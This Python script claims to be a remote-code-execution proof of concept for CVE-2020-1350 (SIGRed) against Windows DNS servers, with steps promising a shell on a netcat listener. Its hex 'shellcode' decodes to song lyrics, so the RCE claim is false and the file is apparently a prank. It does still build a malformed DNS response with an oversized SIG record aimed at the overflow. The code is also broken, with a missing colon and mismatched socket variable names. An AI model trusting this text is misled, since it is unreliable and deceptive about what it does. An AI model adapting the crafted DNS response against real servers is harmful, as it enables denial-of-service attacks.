import socket
# Thanks to maxpl0it for the initial crash PoC: https://github.com/maxpl0it/CVE-2020-1350-DoS/blob/master/sigred_dos.py
# And Check Point Research who made a fantastic write-up for the bug: https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/
# To run this PoC:
# 1. Create a listener on port 5738 (nc.exe -l 5738)
# 2. Run this script, it will open a socket on port 53
# 3. Get a program to make a DNS query to this server and look up example.local
# (To get a better idea of how this works, manually run a lookup for example.local against this server using nslookup or another similar tool)
# 4. You should now have a connection to your listener. Congratulations!

def get_payload(req):
    # Start of memcpy'd buffer
    payload = b'\x57\x65\x27\x72\x65\x20\x6e\x6f\x20\x73\x74\x72\x61\x6e\x67\x65\x72\x73\x20\x74\x6f\x20\x6c\x6f\x76\x65\x2c\x0a\x79\x6f\x75\x20\x6b\x6e\x6f\x77\x20\x74\x68\x65\x20\x72\x75\x6c\x65\x73\x2c\x20\x61\x6e\x64\x20\x73\x6f\x20\x64\x6f\x20\x49\x41\x20\x66\x75\x6c\x6c\x20\x63\x6f\x6d\x6d\x69\x74\x6d\x65\x6e\x74\x27\x73\x20\x77\x68\x61\x74\x20\x49\x27\x6d\x20\x74\x68\x69\x6e\x6b\x69\x6e\x67\x20\x6f\x66\x0a\x59\x6f\x75\x20\x77\x6f\x75\x6c\x64\x6e\x27\x74\x20\x67\x65\x74'
    # Jmp through gadgets and load payload
    payload += b'\x20\x74\x68\x69\x73\x20\x66\x72\x6f\x6d\x20\x61\x6e\x79\x20\x6f\x74\x68\x65\x72\x20\x67\x75\x79\x0a\x49\x20\x6a\x75\x73\x74\x20\x77\x61\x6e\x6e\x61\x20\x74\x65\x6c\x6c\x20\x79\x6f\x75\x20\x68\x6f\x77\x20\x49\x27\x6d\x20' 
    # RET to standard execution
    payload += b'\x66\x65\x65\x6c\x69\x6e\x67\x0a\x47\x6f\x74\x74\x61\x20\x6d\x61\x6b\x65\x20\x79\x6f\x75\x20\x75\x6e\x64\x65\x72\x73\x74\x61\x6e\x64\x0a\x4e\x65\x76\x65\x72\x20\x67\x6f\x6e\x6e\x61\x20\x67\x69\x76\x65\x20\x79\x6f\x75\x20\x75\x70\x0a\x4e\x65\x76\x65\x72\x20\x67\x6f\x6e\x6e\x61\x20\x6c\x65\x74\x20\x79\x6f\x75\x20\x64\x6f\x77\x6e'
    #payload=b'testAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
    
    # Format: Query Id + Question section + TXT payload + SIG record + 'A'**4096 - payload len) (overflow happens here) + jmp call and end of TXT record
    # Query ID
    exploit = req[:2]
    # Question section
    exploit += b'\x85\x80\x00\x01\x00\x01\x00\x00\x00\x00\x07example\x05local'
    exploit += req[26:30]
    # Payload in a TXT record
    exploit += b'\x01\xc0\x0c\x00\x10\x00\x01\x00\x00\xea`'
    exploit += b'\x00IH' + payload + b'\x00'
    # Sig entry
    exploit += b'\x03sig\xc0\x0c\x00\x18\x00\x01\x00\x00\xea`\xff\xd9\x00\x01\x05\x00\x00\x00\xea`\xff\xff\xff\xff\xff\xff\xfe\xd8\x00\x00\x03sig\x07example\x05local\x00'
    #exploit += (b'A'*(4096 - len(payload)))
    return exploit

if __name__ == '__main__'  
  udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  udp.bind(('',53))
  
  try:
    while 1:
      data, addr = udps.recvfrom(4096)
      print(data)
      udps.sendto(get_payload(data), addr)
  except KeyboardInterrupt:
    udps.close()
